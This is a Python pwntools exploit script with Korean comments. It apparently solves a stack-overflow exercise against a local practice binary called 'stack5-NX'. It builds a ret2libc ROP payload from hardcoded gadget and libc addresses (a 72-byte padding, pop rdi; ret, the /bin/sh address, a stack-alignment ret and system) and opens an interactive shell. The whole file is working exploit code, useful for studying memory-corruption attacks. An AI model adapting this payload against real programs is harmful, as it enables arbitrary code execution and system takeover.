from pwn import *

# 대상 프로그램 실행
p = process('./stack5-NX')

# ROP 가젯 및 함수 주소 정의
pop_rdi_ret = 0x401203        # pop rdi; ret 가젯 - 첫 번째 인자를 설정하는데 사용
ret = 0x40101a           # ret 가젯 - 스택 정렬을 위해 사용
binsh = 0x7ffff7f795bd   # /bin/sh 문자열 주소 - system 함수의 인자로 사용
libc_system = 0x7ffff7e17290  # system 함수 주소 - 쉘을 실행하기 위해 호출

# 페이로드 구성
payload = b'A' * 0x48     # 버퍼 크기만큼 'A'로 채우기 (72바이트: 버퍼 64바이트 + rbp 8바이트)
payload += p64(pop_rdi_ret)   # 리턴 주소를 pop rdi; ret 가젯으로 덮어쓰기
payload += p64(binsh)     # pop rdi에 의해 스택에서 pop되어 rdi에 저장될 값 (/bin/sh 주소)
payload += p64(ret)       # 스택 정렬을 위한 ret 가젯
payload += p64(libc_system)  # system 함수 호출

# 버퍼 주소 출력 대기
p.recvline()   # "Address of the buffer: " 메시지 수신

# 페이로드 전송
p.sendline(payload)

# 대화형 모드 시작
p.interactive()   # 쉘 획득 후 대화형 세션 시작
